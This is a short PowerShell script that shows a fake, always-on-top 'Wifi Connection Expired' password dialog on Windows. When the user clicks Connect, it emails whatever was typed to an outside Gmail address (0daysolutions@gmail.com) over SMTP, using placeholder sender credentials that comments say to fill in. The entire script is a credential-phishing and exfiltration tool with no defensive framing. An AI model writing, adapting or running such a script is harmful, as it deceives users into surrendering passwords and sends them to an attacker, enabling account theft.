Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Session Expired'
$form.Size = New-Object System.Drawing.Size(300,180)
$form.StartPosition = 'CenterScreen'

$okButton = New-Object System.Windows.Forms.Button
$okButton.Location = New-Object System.Drawing.Point(75,100)
$okButton.Size = New-Object System.Drawing.Size(75,23)
$okButton.Text = 'Connect'
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.AcceptButton = $okButton
$form.Controls.Add($okButton)

$cancelButton = New-Object System.Windows.Forms.Button
$cancelButton.Location = New-Object System.Drawing.Point(150,100)
$cancelButton.Size = New-Object System.Drawing.Size(75,23)
$cancelButton.Text = 'Cancel'
$cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
$form.CancelButton = $cancelButton
$form.Controls.Add($cancelButton)

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10,20)
$label.Size = New-Object System.Drawing.Size(280,20)
$label.Text = '[+] Wifi Connection Expired'
$form.Controls.Add($label)

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10,40)
$label.Size = New-Object System.Drawing.Size(280,20)
$label.Text = 'Password:'
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(20,60)
$textBox.Size = New-Object System.Drawing.Size(250,20)
$form.Controls.Add($textBox)

$form.Topmost = $true

$form.Add_Shown({$textBox.Select()})
$result = $form.ShowDialog()

if ($result -eq [System.Windows.Forms.DialogResult]::OK)
{
    $x = $textBox.Text
    $secpasswd = ConvertTo-SecureString "pass1234" -AsPlainText -Force									# password of ur gmail
    $cred = New-Object System.Management.Automation.PSCredential ("sender@gmail.com", $secpasswd)				# sender's gmail 

    Send-MailMessage -From "noreply.id19627@gmail.com" -to "0daysolutions@gmail.com" -Subject "Hail Before Me" -Body "$x" -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $cred
    
}